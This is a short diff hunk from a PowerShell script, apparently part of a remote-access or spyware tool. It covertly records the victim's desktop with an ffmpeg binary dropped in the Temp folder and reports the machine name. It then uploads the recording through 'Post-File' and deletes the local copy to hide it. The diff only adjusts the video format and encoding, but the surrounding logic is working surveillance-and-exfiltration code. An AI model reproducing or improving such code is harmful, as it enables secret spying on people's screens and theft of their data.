@@ -300,9 +300,9 @@ If (!(Test-Path $Path)){
 sleep 1
 $contents = "$comp $env:COMPUTERNAME $tick Recording Started for $t seconds.."
 Post-Message | Out-Null
-$filePath = "$env:Temp\ScreenClip.mkv"
+$filePath = "$env:Temp\ScreenClip.mp4"
 if ($t.Length -eq 0){$t = 10}
-.$env:Temp\ffmpeg.exe -f gdigrab -t $t -framerate 25 -i desktop $filePath
+.$env:Temp\ffmpeg.exe -f gdigrab -framerate 20 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $filePath
 Post-File
 sleep 1
 rm -Path $filePath -Force
